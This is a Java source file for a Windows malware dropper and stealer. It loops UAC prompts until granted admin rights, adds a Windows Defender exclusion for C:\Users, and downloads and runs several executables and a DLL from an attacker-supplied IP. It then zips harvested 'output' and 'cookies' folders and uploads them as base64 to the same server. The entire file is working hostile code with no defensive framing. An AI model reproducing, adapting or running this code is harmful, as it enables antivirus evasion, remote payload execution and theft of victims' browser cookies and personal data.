// language: Java, file: payload/Payload.java
import com.sun.jna.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Base64;
import java.util.zip.*;

public class Payload {
    public interface Shell32 extends Library {
        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
    }

    public static void main(String[] args) {
        log("--- STARTING ST.JAR ---");
        try {
            if (args.length < 2) {
                log("Missing arguments. Exiting.");
                return;
            }
            
            String accountKey = args[0];
            String serverIp = args[1];
            log("Key: " + accountKey + " | IP: " + serverIp);

            if (!isAdmin()) {
                log("Not admin. Starting UAC loop...");
                uacLoop(accountKey, serverIp);
            } else {
                log("We are Admin! Proceeding.");
                executePayload(accountKey, serverIp);
            }
        } catch (Throwable t) {
            log("FATAL ERROR: " + t.toString());
            StringWriter sw = new StringWriter();
            t.printStackTrace(new PrintWriter(sw));
            log(sw.toString());
        }
    }

    private static void log(String msg) {
        try {
            // Hardcoded path to ensure we can write the log
            File logFile = new File("C:\\java_debug.txt");
            FileWriter fw = new FileWriter(logFile, true);
            fw.write(msg + "\n");
            fw.close();
        } catch (Exception e) {}
    }

    private static boolean isAdmin() {
        try {
            File f = new File("C:\\Windows\\System32\\config");
            return f.list() != null;
        } catch (Exception e) { return false; }
    }

    private static void uacLoop(String key, String ip) {
        String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";
        String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getAbsolutePath();
        
        // Fix URL encoding issues with spaces in the path
        jarPath = jarPath.replace("%20", " ");
        
        while (true) {
            log("Triggering UAC...");
            try {
                int result = Shell32.INSTANCE.ShellExecuteW(
                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 0
                );

                if (result > 32) {
                    log("UAC Accepted. Parent exiting.");
                    System.exit(0); 
                } else {
                    log("UAC Denied (Code: " + result + "). Retrying...");
                }
            } catch (Exception e) {
                log("UAC Loop Error: " + e.toString());
            }
            try { Thread.sleep(500); } catch (Exception e) {}
        }
    }

    private static void executePayload(String key, String ip) {
        try {
            log("Executing payload...");
            String appData = System.getenv("APPDATA");
            File loaderDir = new File(appData, "loader");
            if (!loaderDir.exists()) loaderDir.mkdirs();

            // 1. Add AV Exclusion
            log("Adding AV exclusion...");
            String regPath = "HKLM\\" + "SOFTWARE\\" + "Microsoft" + "\\Windows Defender" + "\\Exclusions\\Paths";
            String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
            Runtime.getRuntime().exec(cmd).waitFor();
            
            // 2. Download EXEs
            log("Downloading payloads...");
            String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
            for (String file : files) {
                downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
            }

            // 3. Execute
            log("Executing 3.exe...");
            ProcessBuilder pb = new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath());
            pb.start();
            
            log("Executing 2.exe...");
            pb = new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all");
            pb.start();
            
            Thread.sleep(2000);
            
            log("Executing 1.exe...");
            pb = new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath());
            pb.start();

            // 4. Harvest & Upload
            log("Waiting for harvest...");
            Thread.sleep(25000);
            File zipFile = new File(loaderDir, "capture.zip");
            zipFolders(new String[]{"output", "cookies"}, zipFile);
            
            log("Uploading capture.zip...");
            uploadFile("http://" + ip + "/api/rpc", zipFile, key);
            log("Done!");

        } catch (Exception e) {
            log("Execute Error: " + e.toString());
        }
    }

    private static void downloadFile(String urlStr, File dest) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
                byte[] buf = new byte[8192];
                int len;
                while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
            }
        } catch (Exception e) {
            log("Download failed for " + urlStr + ": " + e.toString());
        }
    }

    private static void zipFolders(String[] folders, File zipFile) {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            for (String folder : folders) {
                File dir = new File(folder);
                if (!dir.exists()) continue;
                for (File f : dir.listFiles()) {
                    if (f.isFile()) {
                        zos.putNextEntry(new ZipEntry(folder + "/" + f.getName()));
                        Files.copy(f.toPath(), zos);
                        zos.closeEntry();
                    }
                }
            }
        } catch (Exception e) {
            log("Zip failed: " + e.toString());
        }
    }

    private static void uploadFile(String urlStr, File file, String key) {
        try {
            byte[] bytes = Files.readAllBytes(file.toPath());
            String b64 = Base64.getEncoder().encodeToString(bytes);
            String json = "{\"cmd\":\"upload\",\"key\":\"" + key + "\",\"clientId\":1,\"name\":\"capture.zip\",\"data\":\"" + b64 + "\"}";
            
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes());
            }
            conn.getResponseCode();
        } catch (Exception e) {
            log("Upload failed: " + e.toString());
        }
    }
}